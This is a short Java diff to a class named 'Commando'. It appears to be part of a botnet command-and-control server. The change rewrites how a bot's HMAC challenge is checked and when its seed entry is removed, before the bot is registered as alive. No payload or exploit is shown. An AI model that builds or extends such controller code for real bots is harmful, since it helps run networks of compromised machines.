@@ -120,14 +120,12 @@ public class Commando {
 		String idBot = objects.get(0).toString();
 		String hashMac = objects.get(7).toString();
 		SyncIpList<String, Pairs<Long, Integer>> lista = auth.getBotSeed();
-	
 		if (lista != null) {
-			Pairs<String, Pairs<Long, Integer>> elem = lista.getByValue1(idBot);
+			Pairs<String, Pairs<Long, Integer>> elem = lista.removeByValue1(idBot);
 			Pairs<Long, Integer> coppia=elem.getValue2();
 			if (coppia != null) {
 				Long keyNumber = coppia.getValue1();
 				Integer iterationNumber = coppia.getValue2();
-				if (lista.indexOfValue1(idBot)>=0) {
 					if (auth.validateHmac(keyNumber, iterationNumber, hashMac)) {
 						response = "Challenge OK";
 						objects.forEach(obj -> System.out.println("obj: " + obj.toString()));
@@ -139,8 +137,6 @@ public class Commando {
 						Pairs<IP,String> botAlive=new Pairs<IP, String>(new IP(bot.getIp()), bot.getIdBot());
 						nServ.getAliveBot().add(botAlive);
 					}
-				}
-				auth.getBotSeed().removeByValue1(idBot);
 			}
 		}
 		return response;
